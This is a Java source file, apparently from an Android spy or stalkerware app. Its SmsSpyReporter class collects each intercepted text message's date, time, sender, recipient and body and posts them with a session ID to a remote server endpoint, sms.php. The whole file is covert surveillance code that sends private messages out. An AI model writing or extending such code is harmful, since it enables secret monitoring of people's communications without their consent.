package org.ddth.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.connection.Request;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.SMS;

public class SmsSpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		SMS sms = (SMS) report;
		String date = LOG_DATE_FORMAT.format(sms.date);
		String time = LOG_TIME_FORMAT.format(sms.date);
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("content", date + "\t" + time + "\t" + sms.from + "\t" + sms.to + "\t" + sms.message);
		return new Request(WEBAPI_SERVER_ROOT + "/sms.php", parameters);
	}
}
